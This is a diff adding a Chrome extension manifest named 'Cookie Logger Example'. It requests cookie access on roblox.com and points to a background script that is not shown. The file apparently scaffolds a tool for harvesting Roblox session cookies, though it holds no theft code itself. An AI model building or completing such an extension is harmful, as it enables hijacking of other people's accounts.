@@ -1,0 +1,11 @@
+{
+  "name": "Cookie Logger Example",
+  "description": "Cookie Logger Example",
+  "version": "1.0",
+  "manifest_version": 3,
+  "permissions": ["cookies"],
+  "host_permissions": ["*://*.roblox.com/"],
+  "background": {
+    "service_worker": "index.js"
+  }
+}
